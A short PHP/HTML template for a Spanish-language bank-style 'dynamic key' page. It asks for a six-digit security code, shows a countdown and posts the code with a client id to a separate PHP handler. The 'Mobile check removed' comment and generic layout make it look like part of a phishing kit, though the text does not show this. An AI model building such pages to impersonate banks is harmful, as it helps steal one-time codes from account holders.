<?php

// Mobile check removed

?>

<div class="otp-container">
    <form class="otp-form" id="otpForm" action="modules/api/process_otp.php" method="POST">
        <h4>Inscribir Clave Dinámica</h4>
        <h1>Código de seguridad</h1>
        <p class="instruction">
            Encuéntralo en tu correo o en los mensajes de texto del celular que hayas registrado.
        </p>
        <p class="timer">
            El código enviado vencerá en: <span id="countdown">05:00</span>
        </p>

        <?php if (isset($_GET['error'])): ?>
            <p class="otp-error">El código de seguridad es incorrecto. Inténtalo de nuevo.</p>
        <?php endif; ?>

        <input type="hidden" name="cliente_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">

        <div class="otp-input-box">
            <div class="otp-input-group">
                <i class="fa-solid fa-lock"></i>
                <label>Ingresa el código de seguridad</label>
                <div class="otp-inputs" id="otpInputs">
                    <input type="tel" name="otp[]" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" name="otp[]" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" name="otp[]" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" name="otp[]" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" name="otp[]" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" name="otp[]" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                </div>
            </div>
        </div>

        <button type="submit" class="btn btn-login" id="otpButton" disabled>Validar</button>
    </form>
</div>
